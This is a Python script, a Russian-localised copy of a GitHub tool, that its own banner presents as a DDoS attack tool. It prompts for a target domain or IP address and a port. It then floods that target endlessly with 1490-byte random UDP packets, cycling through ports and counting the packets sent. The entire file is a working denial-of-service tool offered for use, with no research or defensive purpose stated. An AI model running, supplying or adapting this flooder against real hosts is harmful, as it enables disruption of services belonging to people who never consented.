# Ru version
# Original https://github.com/BOT-CODER/SniperMan
from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
################################################################################
banner=Fore.MAGENTA+'''
Инструмент для ДДОС АТАКИ                                          
'''+Fore.RESET
credit=(Fore.CYAN+
'''                                                                     Автор сея чуда : Itskekoff
	                                                             Гитхаб автора : https://github.com/itskek                                                          
'''+Fore.RESET)
################################################################################
#platform info
uname=system()
if uname=="Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
def chech_con():
	try:
		request.urlopen('https://www.google.co.in/',timeout=3)
	except KeyboardInterrupt:
		print(Fore.RED + "Остановка от пользователя" + Fore.RESET)
		exit()
	except:
		print(Fore.RED+'Проверь свой интернет!'+Fore.RESET)
		exit()
	print(Fore.RED + "Остановил пользователем" + Fore.RESET)
	exit()
try:
	while True:
		print(banner)
		print(credit)
		print(Fore.RED+"1. Домайн сайта\n2. Айпи адрес\n3. Выход"+Fore.RESET)
		opt=str(input(Fore.GREEN+"\nВыбери цифру: "+Fore.RESET))
		if opt=='1':
			domain=str(input(Fore.CYAN+"Введи сайт (например: google.com):"+Fore.RESET))
			ip=socket.gethostbyname(domain)
			break
		elif opt=='2':
			ip = input(Fore.CYAN+"Айпи адрес  : "+Fore.RESET)
			break
		elif opt=='3':
			time.sleep(1)
			print(Fore.RED+"Прощай("+Fore.RESET)
			exit()
		else:
			print(Fore.RED+'Неверный выбор!'+Fore.RESET)
			time.sleep(2)
			os.system(cmd)
	port =int(input(Fore.CYAN+"Номер порта  : "+Fore.RESET))
	os.system(cmd)
	print(Fore.CYAN+"Инициализация....")
	for i in tqdm(range(10000)):
		print(end='\r')
	time.sleep(4)
	print('Запуск...')
	time.sleep(4)
	sent = 0
except Exception as e:
	print(Fore.RED+"Что-то пошло не так!")
	print("Причина:",e,Fore.RESET)
	exit()
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print(Fore.CYAN+ "Отправил %s пакетов на %s используя порт:%s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except Exception as e:
	print(Fore.RED+"Выход!\nПричина: ",e,Fore.RESET)
except KeyboardInterrupt:
	print(Fore.RED+"\nОстановка пользователем!"+Fore.RESET)
